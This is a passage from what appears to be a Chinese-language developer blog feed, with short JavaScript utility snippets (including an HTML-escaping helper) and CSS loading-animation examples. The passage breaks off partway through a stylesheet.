class="number">10</span>);</span><br><span class="line"><span class="comment">// id =&gt; &quot;jg7zpgiqva&quot;</span></span><br></pre></td></tr></table></figure><h5 id="生成星级评分"><a href="#生成星级评分" class="headerlink" title="生成星级评分"></a>生成星级评分</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">StartScore</span> = rate =&gt; <span class="string">&quot;★★★★★☆☆☆☆☆&quot;</span>.<span class="title function_">slice</span>(<span class="number">5</span> - rate, <span class="number">10</span> - rate);</span><br><span class="line"><span class="keyword">const</span> start = <span class="title class_">StartScore</span>(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// start =&gt; &quot;★★★&quot;</span></span><br></pre></td></tr></table></figure><h5 id="精确小数"><a href="#精确小数" class="headerlink" title="精确小数"></a>精确小数</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">RoundNum</span> = (<span class="params">num, decimal</span>) =&gt; <span class="title class_">Math</span>.<span class="title function_">round</span>(num * <span class="number">10</span> ** decimal) / <span class="number">10</span> ** decimal;</span><br><span class="line"><span class="keyword">const</span> num = <span class="title class_">RoundNum</span>(<span class="number">1.69</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><h5 id="生成范围随机数"><a href="#生成范围随机数" class="headerlink" title="生成范围随机数"></a>生成范围随机数</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">RandomNum</span> = (<span class="params">min, max</span>) =&gt; <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (max - min + <span class="number">1</span>)) + min;</span><br><span class="line"><span class="keyword">const</span> num = <span class="title class_">RandomNum</span>(<span class="number">1</span>, <span class="number">10</span>);</span><br></pre></td></tr></table></figure><h5 id="判断数据类型"><a href="#判断数据类型" class="headerlink" title="判断数据类型"></a>判断数据类型</h5><blockquote><p>可判断类型：undefined、null、string、number、boolean、array、object、symbol、date、regexp、function、asyncfunction、arguments、set、map、weakset、weakmap</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isDataType</span>(<span class="params">data, type</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> dataType = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(data).<span class="title function_">replace</span>(<span class="regexp">/\[object (\w+)\]/</span>, <span class="string">&quot;$1&quot;</span>).<span class="title function_">toLowerCase</span>();</span><br><span class="line">    <span class="keyword">return</span> type ? dataType === type : dataType;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">isDataType</span>(<span class="string">&quot;young&quot;</span>); <span class="comment">// &quot;string&quot;</span></span><br><span class="line"><span class="title function_">isDataType</span>(<span class="number">20190214</span>); <span class="comment">// &quot;number&quot;</span></span><br><span class="line"><span class="title function_">isDataType</span>(<span class="literal">true</span>); <span class="comment">// &quot;boolean&quot;</span></span><br><span class="line"><span class="title function_">isDataType</span>([], <span class="string">&quot;array&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="title function_">isDataType</span>(&#123;&#125;, <span class="string">&quot;array&quot;</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h5 id="过滤空值"><a href="#过滤空值" class="headerlink" title="过滤空值"></a>过滤空值</h5><blockquote><p>空值：undefined、null、””、0、false、NaN</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="literal">undefined</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="literal">false</span>, <span class="title class_">NaN</span>, <span class="number">1</span>, <span class="number">2</span>].<span class="title function_">filter</span>(<span class="title class_">Boolean</span>);</span><br><span class="line"><span class="comment">// arr =&gt; [1, 2]</span></span><br></pre></td></tr></table></figure><h5 id="一次性函数"><a href="#一次性函数" class="headerlink" title="一次性函数"></a>一次性函数</h5><blockquote><p>适用于运行一些只需执行一次的初始化代码</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">    <span class="title class_">Func</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;y&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Func</span>() <span class="comment">// x</span></span><br><span class="line"><span class="title class_">Func</span>() <span class="comment">// y</span></span><br><span class="line"><span class="title class_">Func</span>() <span class="comment">// y</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="惰性载入函数"><a href="#惰性载入函数" class="headerlink" title="惰性载入函数"></a>惰性载入函数</h5><blockquote><p>函数内判断分支较多较复杂时可大大节约资源开销</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a === b) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;y&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 换成</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a === b) &#123;</span><br><span class="line">        <span class="title class_">Func</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">Func</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;y&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Func</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="优雅处理Async-x2F-Await参数"><a href="#优雅处理Async-x2F-Await参数" class="headerlink" title="优雅处理Async&#x2F;Await参数"></a>优雅处理Async&#x2F;Await参数</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">AsyncTo</span>(<span class="params">promise</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> promise.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> [<span class="literal">null</span>, data]).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> [err]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> [err, res] = <span class="keyword">await</span> <span class="title class_">AsyncTo</span>(<span class="title class_">Func</span>());</span><br></pre></td></tr></table></figure><h5 id="过滤XSS"><a href="#过滤XSS" class="headerlink" title="过滤XSS"></a>过滤XSS</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">FilterXss</span>(<span class="params">content</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> elem = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    elem.<span class="property">innerText</span> = content;</span><br><span class="line">    <span class="keyword">const</span> result = elem.<span class="property">innerHTML</span>;</span><br><span class="line">    elem = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="显示全部DOM边框"><a href="#显示全部DOM边框" class="headerlink" title="显示全部DOM边框"></a>显示全部DOM边框</h5><blockquote><p>调试页面元素边界时使用</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[].<span class="property">forEach</span>.<span class="title function_">call</span>($$(<span class="string">&quot;*&quot;</span>), <span class="function"><span class="params">dom</span> =&gt;</span> &#123;</span><br><span class="line">    dom.<span class="property">style</span>.<span class="property">outline</span> = <span class="string">&quot;1px solid #&quot;</span> + (~~(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (<span class="number">1</span> &lt;&lt; <span class="number">24</span>))).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">[].<span class="property">forEach</span>.<span class="title function_">call</span>($$(<span class="string">&quot;*&quot;</span>), <span class="function"><span class="params">dom</span> =&gt;</span> &#123;</span><br><span class="line">    dom.<span class="property">style</span>.<span class="property">outline</span> = <span class="string">&quot;unset&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="自适应页面"><a href="#自适应页面" class="headerlink" title="自适应页面"></a>自适应页面</h5><blockquote><p>页面基于一张设计图但需做多款机型自适应，元素尺寸使用<code>rem</code>进行设置</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">AutoResponse</span>(<span class="params">width = <span class="number">750</span></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> target = <span class="variable language_">document</span>.<span class="property">documentElement</span>;</span><br><span class="line">    target.<span class="property">clientWidth</span> &gt;= <span class="number">600</span></span><br><span class="line">        ? (target.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="string">&quot;80px&quot;</span>)</span><br><span class="line">        : (target.<span class="property">style</span>.<span class="property">fontSize</span> = target.<span class="property">clientWidth</span> / width * <span class="number">100</span> + <span class="string">&quot;px&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JS-常用工具&quot;&gt;&lt;a href=&quot;#JS-常用工具&quot; class=&quot;headerlink&quot; title=&quot;JS 常用工具&quot;&gt;&lt;/a&gt;JS 常用工具&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/684490409031342490</summary>
      
    
    
    
    <category term="JS常用工具" scheme="https://hisai3.github.io/hisai3.github.io/categories/JS%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="javascript" scheme="https://hisai3.github.io/hisai3.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>Loading 动画</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/01/14/Loading%20%E5%8A%A8%E7%94%BB/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/01/14/Loading%20%E5%8A%A8%E7%94%BB/</id>
    <published>2023-01-14T06:31:31.000Z</published>
    <updated>2023-01-15T07:05:38.049Z</updated>
    
    <content type="html"><![CDATA[<p>小功能</p><h3 id="Loading-动画"><a href="#Loading-动画" class="headerlink" title="Loading 动画"></a>Loading 动画</h3><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">  &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    div &#123;</span><br><span class="line">      display: inline-block;</span><br><span class="line">      width: 10px;</span><br><span class="line">      height: 20px;</span><br><span class="line">      border: 1px solid #eee;</span><br><span class="line">      animation: show 2s infinite cubic-bezier(0.075, 0.82, 0.165, 1);</span><br><span class="line">    &#125;</span><br><span class="line">/* 1.关键在于延迟 */</span><br><span class="line">    div:nth-child(1) &#123;</span><br><span class="line">      animation-delay: -1.0s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    div:nth-child(2) &#123;</span><br><span class="line">      animation-delay: -0.8s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    div:nth-child(3) &#123;</span><br><span class="line">      animation-delay: -0.7s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    div:nth-child(4) &#123;</span><br><span class="line">      animation-delay: -0.6s;</span><br><span class="line">    &#125;</span><br><span class="line">/* 2.其次在于每帧 */</span><br><span class="line">    @keyframes show &#123;</span><br><span class="line">      0% &#123;</span><br><span class="line">        transform: scaleY(0.4);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      25% &#123;</span><br><span class="line">        transform: scaleY(1.0);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      50% &#123;</span><br><span class="line">        transform: scaleY(0.4);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      75% &#123;</span><br><span class="line">        transform: scaleY(0.4);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      100% &#123;</span><br><span class="line">        transform: scaleY(0.4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.loading3</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>:<span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>:<span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>:<span class="number">50px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>:relative;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.circle</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>:absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>:<span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>:<span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.circle</span> <span class="selector-tag">span</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>:<span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>:<span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>:inline-block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>:<span class="number">#67CF22</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>:absolute;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation</span>: mycircle <span class="number">1.2s</span> infinite ease-in-out;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation</span>: mycircle <span class="number">1.2s</span> infinite ease-in-out;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-fill-mode</span>:both;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-fill-mode</span>:both;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle2</span>&#123;</span></span><br><span class="line"><span class="language-css">           -webkit-<span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(<span class="number">45deg</span>);</span></span><br><span class="line"><span class="language-css">           <span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(<span class="number">45deg</span>);</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle3</span>&#123;</span></span><br><span class="line"><span class="language-css">           -webkit-<span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(<span class="number">90deg</span>);</span></span><br><span class="line"><span class="language-css">           <span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(<span class="number">90deg</span>);</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle</span>&gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle</span>&gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">right</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle</span>&gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">right</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">bottom</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle</span>&gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">bottom</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle2</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">1.1s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">1.1s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle3</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">1.0s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">1.0s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle1</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.9s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">0.9s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle2</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.8s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">0.8s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle3</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.7s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">0.7s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle1</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.6s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">0.6s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle2</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.7s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">0.7s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle3</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.4s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: -<span class="number">0.4s</span>;</span></span><br><span class="line"><span class="language-css">       &#125;</span></span><br><span class="line"><span class="language-css">       <span class="selector-class">.circle1</span> &gt;<span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="language-css">            -webkit-<span class="attribute">animation-delay</span>: -<span class="number">0.3s</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">animation-delay</span>: 